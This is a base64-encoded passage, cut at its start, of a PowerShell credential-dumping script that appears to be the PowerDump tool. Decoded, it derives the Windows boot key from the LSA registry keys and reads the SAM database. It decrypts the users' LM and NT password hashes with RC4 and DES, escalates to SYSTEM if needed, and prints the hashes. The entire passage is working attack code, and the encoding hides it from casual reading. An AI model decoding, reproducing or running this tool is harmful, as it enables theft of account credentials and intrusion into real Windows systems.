dChbaW50XSgkc1syXSksMyk7CiAgICAgICAgICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1syXSkgLWJhbmQgMHgwNyksIDQpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbM10pLDQpOwogICAgICAgICAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbM10pIC1iYW5kIDB4MEYpLCAzKSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzRdKSw1KTsKICAgICAgICAgICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzRdKSAtYmFuZCAweDFGKSwgMikgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1s1XSksNik7CiAgICAgICAgICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1s1XSkgLWJhbmQgMHgzRiksIDEpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbNl0pLDcpOwogICAgICAgICAgICAka2V5ICs9ICQoW2ludF0oJHNbNl0pIC1iYW5kIDB4N0YpOwogICAgICAgICAgICAwLi43IHwgJXsKICAgICAgICAgICAgICAgICRrZXlbJF9dID0gW1NoaWZ0XTo6TGVmdCgka2V5WyRfXSwgMSk7CiAgICAgICAgICAgICAgICAka2V5WyRfXSA9ICRvZGRfcGFyaXR5WyRrZXlbJF9dXTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICwka2V5OwogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBOZXdSQzQoW2J5dGVbXV0ka2V5KQogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuIG5ldy1vYmplY3QgT2JqZWN0IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkga2V5ICRrZXkgLVBhc3NUaHJ1IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgUyAkbnVsbCAtUGFzc1RocnUgfAogICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdE1ldGhvZCBpbml0IHsKICAgICAgICAgICAgICAgIGlmICgtbm90ICR0aGlzLlMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgW2J5dGVbXV0kdGhpcy5TID0gMC4uMjU1OwogICAgICAgICAgICAgICAgICAgIDAuLjI1NSB8ICUgLWJlZ2lue1tsb25nXSRqPTA7fXsKICAgICAgICAgICAgICAgICAgICAgICAgJGogPSAoJGogKyAkdGhpcy5rZXlbJCgkXyAlICR0aGlzLmtleS5MZW5ndGgpXSArICR0aGlzLlNbJF9dKSAlICR0aGlzLlMuTGVuZ3RoOwogICAgICAgICAgICAgICAgICAgICAgICAkdGVtcCA9ICR0aGlzLlNbJF9dOyAkdGhpcy5TWyRfXSA9ICR0aGlzLlNbJGpdOyAkdGhpcy5TWyRqXSA9ICR0ZW1wOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gLVBhc3NUaHJ1IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBTY3JpcHRNZXRob2QgImVuY3J5cHQiIHsKICAgICAgICAgICAgICAgICRkYXRhID0gJGFyZ3NbMF07CiAgICAgICAgICAgICAgICAkdGhpcy5pbml0KCk7CiAgICAgICAgICAgICAgICAkb3V0YnVmID0gbmV3LW9iamVjdCBieXRlW10gJCgkZGF0YS5MZW5ndGgpOwogICAgICAgICAgICAgICAgJFMyID0gJHRoaXMuU1swLi4kdGhpcy5TLkxlbmd0aF07CiAgICAgICAgICAgICAgICAwLi4kKCRkYXRhLkxlbmd0aC0xKSB8ICUgLWJlZ2lueyRpPTA7JGo9MDt9IHsKICAgICAgICAgICAgICAgICAgICAkaSA9ICgkaSsxKSAlICRTMi5MZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgJGogPSAoJGogKyAkUzJbJGldKSAlICRTMi5MZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgJHRlbXAgPSAkUzJbJGldOyRTMlskaV0gPSAkUzJbJGpdOyRTMlskal0gPSAkdGVtcDsKICAgICAgICAgICAgICAgICAgICAkYSA9ICRkYXRhWyRfXTsKICAgICAgICAgICAgICAgICAgICAkYiA9ICRTMlsgJCgkUzJbJGldKyRTMlskal0pICUgJFMyLkxlbmd0aCBdOwogICAgICAgICAgICAgICAgICAgICRvdXRidWZbJF9dID0gKCRhIC1ieG9yICRiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybiAsJG91dGJ1ZjsKICAgICAgICAgICAgfSAtUGFzc1RocnUKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gZGVzX2VuY3J5cHQoW2J5dGVbXV0kZGF0YSwgW2J5dGVbXV0ka2V5KQogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuICwoZGVzX3RyYW5zZm9ybSAkZGF0YSAka2V5ICR0cnVlKQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBkZXNfZGVjcnlwdChbYnl0ZVtdXSRkYXRhLCBbYnl0ZVtdXSRrZXkpCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4gLChkZXNfdHJhbnNmb3JtICRkYXRhICRrZXkgJGZhbHNlKQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBkZXNfdHJhbnNmb3JtKFtieXRlW11dJGRhdGEsIFtieXRlW11dJGtleSwgJGRvRW5jcnlwdCkKICAgICAgICB7CiAgICAgICAgICAgICRkZXMgPSBuZXctb2JqZWN0IFNlY3VyaXR5LkNyeXB0b2dyYXBoeS5ERVNDcnlwdG9TZXJ2aWNlUHJvdmlkZXI7CiAgICAgICAgICAgICRkZXMuTW9kZSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkVDQjsKICAgICAgICAgICAgJGRlcy5QYWRkaW5nID0gW1NlY3VyaXR5LkNyeXB0b2dyYXBoeS5QYWRkaW5nTW9kZV06Ok5vbmU7CiAgICAgICAgICAgICRkZXMuS2V5ID0gJGtleTsKICAgICAgICAgICAgJGRlcy5JViA9ICRrZXk7CiAgICAgICAgICAgICR0cmFuc2Zvcm0gPSAkbnVsbDsKICAgICAgICAgICAgaWYgKCRkb0VuY3J5cHQpIHskdHJhbnNmb3JtID0gJGRlcy5DcmVhdGVFbmNyeXB0b3IoKTt9CiAgICAgICAgICAgIGVsc2V7JHRyYW5zZm9ybSA9ICRkZXMuQ3JlYXRlRGVjcnlwdG9yKCk7fQogICAgICAgICAgICAkcmVzdWx0ID0gJHRyYW5zZm9ybS5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRkYXRhLCAwLCAkZGF0YS5MZW5ndGgpOwogICAgICAgICAgICByZXR1cm4gLCRyZXN1bHQ7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIEdldC1SZWdLZXlDbGFzcyhbc3RyaW5nXSRrZXksIFtzdHJpbmddJHN1YmtleSkKICAgICAgICB7CiAgICAgICAgICAgIHN3aXRjaCAoJEtleSkgewogICAgICAgICAgICAgICAgIkhLQ1IiIHsgJG5LZXkgPSAweDgwMDAwMDAwfSAjSEsgQ2xhc3NlcyBSb290CiAgICAgICAgICAgICAgICAiSEtDVSIgeyAkbktleSA9IDB4ODAwMDAwMDF9ICNISyBDdXJyZW50IFVzZXIKICAgICAgICAgICAgICAgICJIS0xNIiB7ICRuS2V5ID0gMHg4MDAwMDAwMn0gI0hLIExvY2FsIE1hY2hpbmUKICAgICAgICAgICAgICAgICJIS1UiICB7ICRuS2V5ID0gMHg4MDAwMDAwM30gI0hLIFVzZXJzCiAgICAgICAgICAgICAgICAiSEtDQyIgeyAkbktleSA9IDB4ODAwMDAwMDV9ICNISyBDdXJyZW50IENvbmZpZwogICAgICAgICAgICAgICAgZGVmYXVsdCB7IAogICAgICAgICAgICAgICAgICAgIHRocm93ICJJbnZhbGlkIEtleS4gVXNlIG9uZSBvZiB0aGUgZm9sbG93aW5nIG9wdGlvbnMgSEtDUiwgSEtDVSwgSEtMTSwgSEtVLCBIS0NDIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRLRVlRVUVSWVZBTFVFID0gMHgxOwogICAgICAgICAgICAkS0VZUkVBRCA9IDB4MTk7CiAgICAgICAgICAgICRLRVlBTExBQ0NFU1MgPSAweDNGOwogICAgICAgICAgICAkcmVzdWx0ID0gIiI7CiAgICAgICAgICAgIFtpbnRdJGhrZXk9MAogICAgICAgICAgICBpZiAoLW5vdCBbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ09wZW5LZXlFeCgkbmtleSwkc3Via2V5LDAsJEtFWVJFQUQsW3JlZl0kaGtleSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRjbGFzc1ZhbCA9IE5ldy1PYmplY3QgVGV4dC5TdHJpbmdidWlsZGVyIDEwMjQKICAgICAgICAgICAgICAgIFtpbnRdJGxlbiA9IDEwMjQKICAgICAgICAgICAgICAgIGlmICgtbm90IFtQb3dlckR1bXAuTmF0aXZlXTo6UmVnUXVlcnlJbmZvS2V5KCRoa2V5LCRjbGFzc1ZhbCxbcmVmXSRsZW4sMCxbcmVmXSRudWxsLFtyZWZdJG51bGwsCiAgICAgICAgICAgICAgICAgICAgW3JlZl0kbnVsbCxbcmVmXSRudWxsLFtyZWZdJG51bGwsW3JlZl0kbnVsbCxbcmVmXSRudWxsLDApKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkY2xhc3NWYWwuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLUVycm9yICJSZWdRdWVyeUluZm9LZXkgZmFpbGVkIjsKICAgICAgICAgICAgICAgIH0gICAKICAgICAgICAgICAgICAgIFtQb3dlckR1bXAuTmF0aXZlXTo6UmVnQ2xvc2VLZXkoJGhrZXkpIHwgT3V0LU51bGwKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLUVycm9yICJDYW5ub3Qgb3BlbiBrZXkiOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBHZXQtQm9vdEtleQogICAgICAgIHsKICAgICAgICAgICAgJHMgPSBbc3RyaW5nXTo6Sm9pbigiIiwkKCJKRCIsIlNrZXcxIiwiR0JHIiwiRGF0YSIgfCAle0dldC1SZWdLZXlDbGFzcyAiSEtMTSIgIlNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXExzYVwkXyJ9KSk7CiAgICAgICAgICAgICRiID0gbmV3LW9iamVjdCBieXRlW10gJCgkcy5MZW5ndGgvMik7CiAgICAgICAgICAgIDAuLiQoJGIuTGVuZ3RoLTEpIHwgJXskYlskX10gPSBbQ29udmVydF06OlRvQnl0ZSgkcy5TdWJzdHJpbmcoJCgkXyoyKSwyKSwxNil9CiAgICAgICAgICAgICRiMiA9IG5ldy1vYmplY3QgYnl0ZVtdIDE2OwogICAgICAgICAgICAweDgsIDB4NSwgMHg0LCAweDIsIDB4YiwgMHg5LCAweGQsIDB4MywgMHgwLCAweDYsIDB4MSwgMHhjLCAweGUsIDB4YSwgMHhmLCAweDcgfCAlIC1iZWdpbnskaT0wO317JGIyWyRpXT0kYlskX107JGkrK30KICAgICAgICAgICAgcmV0dXJuICwkYjI7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIEdldC1IQm9vdEtleQogICAgICAgIHsKICAgICAgICAgICAgcGFyYW0oW2J5dGVbXV0kYm9vdGtleSk7CiAgICAgICAgICAgICRhcXdlcnR5ID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiIUAjJCVeJiooKXF3ZXJ0eVVJT1BBenhjdmJubVFRUVFRUVFRUVFRUSkoKkAmJWAwIik7CiAgICAgICAgICAgICRhbnVtID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiMDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OWAwIik7CiAgICAgICAgICAgICRrID0gR2V0LUl0ZW0gSEtMTTpcU0FNXFNBTVxEb21haW5zXEFjY291bnQ7CiAgICAgICAgICAgIGlmICgtbm90ICRrKSB7cmV0dXJuICRudWxsfQogICAgICAgICAgICBbYnl0ZVtdXSRGID0gJGsuR2V0VmFsdWUoIkYiKTsKICAgICAgICAgICAgaWYgKC1ub3QgJEYpIHtyZXR1cm4gJG51bGx9CiAgICAgICAgICAgICRyYzRrZXkgPSBbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Lk1ENV06OkNyZWF0ZSgpLkNvbXB1dGVIYXNoKCRGWzB4NzAuLjB4N0ZdICsgJGFxd2VydHkgKyAkYm9vdGtleSArICRhbnVtKTsKICAgICAgICAgICAgJHJjNCA9IE5ld1JDNCAkcmM0a2V5OwogICAgICAgICAgICByZXR1cm4gLCgkcmM0LmVuY3J5cHQoJEZbMHg4MC4uMHg5Rl0pKTsKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gR2V0LVVzZXJOYW1lKFtieXRlW11dJFYpCiAgICAgICAgewogICAgICAgICAgICBpZiAoLW5vdCAkVikge3JldHVybiAkbnVsbH07CiAgICAgICAgICAgICRvZmZzZXQgPSBbQml0Q29udmVydGVyXTo6VG9JbnQzMigkVlsweDBjLi4weDBmXSwwKSArIDB4Q0M7CiAgICAgICAgICAgICRsZW4gPSBbQml0Q29udmVydGVyXTo6VG9JbnQzMigkVlsweDEwLi4weDEzXSwwKTsKICAgICAgICAgICAgcmV0dXJuIFtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJFYsICRvZmZzZXQsICRsZW4pOwogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBHZXQtVXNlckhhc2hlcygkdSwgW2J5dGVbXV0kaGJvb3RrZXkpCiAgICAgICAgewogICAgICAgICAgICBbYnl0ZVtdXSRlbmNfbG1faGFzaCA9ICRudWxsOyBbYnl0ZVtdXSRlbmNfbnRfaGFzaCA9ICRudWxsOwogICAgICAgICAgICBpZiAoJHUuSGFzaE9mZnNldCArIDB4MjggLWx0ICR1LlYuTGVuZ3RoKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkbG1faGFzaF9vZmZzZXQgPSAkdS5IYXNoT2Zmc2V0ICsgNDsKICAgICAgICAgICAgICAgICRudF9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA4ICsgMHgxMDsKICAgICAgICAgICAgICAgICRlbmNfbG1faGFzaCA9ICR1LlZbJCgkbG1faGFzaF9vZmZzZXQpLi4kKCRsbV9oYXNoX29mZnNldCsweDBmKV07CiAgICAgICAgICAgICAgICAkZW5jX250X2hhc2ggPSAkdS5WWyQoJG50X2hhc2hfb2Zmc2V0KS4uJCgkbnRfaGFzaF9vZmZzZXQrMHgwZildOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJHUuSGFzaE9mZnNldCArIDB4MTQgLWx0ICR1LlYuTGVuZ3RoKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkbnRfaGFzaF9vZmZzZXQgPSAkdS5IYXNoT2Zmc2V0ICsgODsKICAgICAgICAgICAgICAgICRlbmNfbnRfaGFzaCA9IFtieXRlW11dJHUuVlskKCRudF9oYXNoX29mZnNldCkuLiQoJG50X2hhc2hfb2Zmc2V0KzB4MGYpXTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gLChEZWNyeXB0SGFzaGVzICR1LlJpZCAkZW5jX2xtX2hhc2ggJGVuY19udF9oYXNoICRoYm9vdGtleSk7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIERlY3J5cHRIYXNoZXMoJHJpZCwgW2J5dGVbXV0kZW5jX2xtX2hhc2gsIFtieXRlW11dJGVuY19udF9oYXNoLCBbYnl0ZVtdXSRoYm9vdGtleSkKICAgICAgICB7CiAgICAgICAgICAgIFtieXRlW11dJGxtaGFzaCA9ICRlbXB0eV9sbTsgW2J5dGVbXV0kbnRoYXNoPSRlbXB0eV9udDsKICAgICAgICAgICAgIyBMTSBIYXNoCiAgICAgICAgICAgIGlmICgkZW5jX2xtX2hhc2gpCiAgICAgICAgICAgIHsgICAgCiAgICAgICAgICAgICAgICAkbG1oYXNoID0gRGVjcnlwdFNpbmdsZUhhc2ggJHJpZCAkaGJvb3RrZXkgJGVuY19sbV9oYXNoICRhbG1wYXNzd29yZDsKICAgICAgICAgICAgfQogICAgCiAgICAgICAgICAgICMgTlQgSGFzaAogICAgICAgICAgICBpZiAoJGVuY19udF9oYXNoKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkbnRoYXNoID0gRGVjcnlwdFNpbmdsZUhhc2ggJHJpZCAkaGJvb3RrZXkgJGVuY19udF9oYXNoICRhbnRwYXNzd29yZDsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gLCgkbG1oYXNoLCRudGhhc2gpCiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIERlY3J5cHRTaW5nbGVIYXNoKCRyaWQsW2J5dGVbXV0kaGJvb3RrZXksW2J5dGVbXV0kZW5jX2hhc2gsW2J5dGVbXV0kbG1udHN0cikKICAgICAgICB7CiAgICAgICAgICAgICRkZXNrZXlzID0gc2lkX3RvX2tleSAkcmlkOwogICAgICAgICAgICAkbWQ1ID0gW1NlY3VyaXR5LkNyeXB0b2dyYXBoeS5NRDVdOjpDcmVhdGUoKTsKICAgICAgICAgICAgJHJjNF9rZXkgPSAkbWQ1LkNvbXB1dGVIYXNoKCRoYm9vdGtleVswLi4weDBmXSArIFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcmlkKSArICRsbW50c3RyKTsKICAgICAgICAgICAgJHJjNCA9IE5ld1JDNCAkcmM0X2tleTsKICAgICAgICAgICAgJG9iZmtleSA9ICRyYzQuZW5jcnlwdCgkZW5jX2hhc2gpOwogICAgICAgICAgICAkaGFzaCA9IChkZXNfZGVjcnlwdCAgJG9iZmtleVswLi43XSAkZGVza2V5c1swXSkgKyAKICAgICAgICAgICAgICAgIChkZXNfZGVjcnlwdCAkb2Jma2V5WzguLiQoJG9iZmtleS5MZW5ndGggLSAxKV0gJGRlc2tleXNbMV0pOwogICAgICAgICAgICByZXR1cm4gLCRoYXNoOwogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBHZXQtVXNlcktleXMKICAgICAgICB7CiAgICAgICAgICAgIGxzIEhLTE06XFNBTVxTQU1cRG9tYWluc1xBY2NvdW50XFVzZXJzIHwgCiAgICAgICAgICAgICAgICB3aGVyZSB7JF8uUFNDaGlsZE5hbWUgLW1hdGNoICJeWzAtOUEtRmEtZl17OH0kIn0gfCAKICAgICAgICAgICAgICAgICAgICBBZGQtTWVtYmVyIEFsaWFzUHJvcGVydHkgS2V5TmFtZSBQU0NoaWxkTmFtZSAtUGFzc1RocnUgfAogICAgICAgICAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgUmlkIHtbQ29udmVydF06OlRvSW50MzIoJHRoaXMuUFNDaGlsZE5hbWUsIDE2KX0gLVBhc3NUaHJ1IHwKICAgICAgICAgICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IFYge1tieXRlW11dKCR0aGlzLkdldFZhbHVlKCJWIikpfSAtUGFzc1RocnUgfAogICAgICAgICAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgVXNlck5hbWUge0dldC1Vc2VyTmFtZSgkdGhpcy5HZXRWYWx1ZSgiViIpKX0gLVBhc3NUaHJ1IHwKICAgICAgICAgICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IEhhc2hPZmZzZXQge1tCaXRDb252ZXJ0ZXJdOjpUb1VJbnQzMigkdGhpcy5HZXRWYWx1ZSgiViIpWzB4OWMuLjB4OWZdLDApICsgMHhDQ30gLVBhc3NUaHJ1CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIER1bXBIYXNoZXMKICAgICAgICB7CiAgICAgICAgICAgIExvYWRBcGkKICAgICAgICAgICAgJGJvb3RrZXkgPSBHZXQtQm9vdEtleTsKICAgICAgICAgICAgJGhib290S2V5ID0gR2V0LUhCb290S2V5ICRib290a2V5OwogICAgICAgICAgICBHZXQtVXNlcktleXMgfCAlewogICAgICAgICAgICAgICAgJGhhc2hlcyA9IEdldC1Vc2VySGFzaGVzICRfICRoQm9vdEtleTsKICAgICAgICAgICAgICAgICJ7MH06ezF9OnsyfTp7M306OjoiIC1mICgkXy5Vc2VyTmFtZSwkXy5SaWQsIAogICAgICAgICAgICAgICAgICAgIFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkaGFzaGVzWzBdKS5SZXBsYWNlKCItIiwiIikuVG9Mb3dlcigpLCAKICAgICAgICAgICAgICAgICAgICBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJGhhc2hlc1sxXSkuUmVwbGFjZSgiLSIsIiIpLlRvTG93ZXIoKSk7CiAgICAgICAgICAgICAgICMiYG4iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKFtwcml2XTo6SXNVc2VyQW5BZG1pbigpKQogICAgICAgIHsKICAgICAgICAgICAgaWYgKFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKS5Jc1N5c3RlbSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgRHVtcEhhc2hlcwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgRWxldmF0ZVByaXZzCiAgICAgICAgICAgICAgICBpZiAoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLklzU3lzdGVtKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIER1bXBIYXNoZXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBlY2hvICJBZG1pbmlzdHJhdG9yIG9yIFN5c3RlbSBwcml2aWxlZ2VzIG5lY2Vzc2FyeS4iCiAgICAgICAgICAgIFdyaXRlLUVycm9yICJBZG1pbmlzdHJhdG9yIG9yIFN5c3RlbSBwcml2aWxlZ2VzIG5lY2Vzc2FyeS4iCiAgICAgICAgICAgIAogICAgICAgIH0KfQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZWNobyAiIyNIYXNoZXMiCmVjaG8gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKZWNobyAiIgoKIyBVcGRhdGUgb3V0cHV0IGJ1ZmZlciBzaXplIHRvIDUwMAppZiggJEhvc3QgLWFuZCAkSG9zdC5VSSAtYW5kICRIb3N0LlVJLlJhd1VJICkgewogICRyYXdVSSA9ICRIb3N0LlVJLlJhd1VJCiAgJG9sZFNpemUgPSAkcmF3VUkuQnVmZmVyU2l6ZQogICR0eXBlTmFtZSA9ICRvbGRTaXplLkdldFR5cGUoICkuRnVsbE5hbWUKICAkbmV3U2l6ZSA9IE5ldy1PYmplY3QgJHR5cGVOYW1lICg1MDAsICRvbGRTaXplLkhlaWdodCkKICAkcmF3VUkuQnVmZmVyU2l6ZSA9ICRuZXdTaXplCn0KCkludm9rZS1Qb3dlckR1bXAKZWNobyAiYG5gbmBuIgoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMK
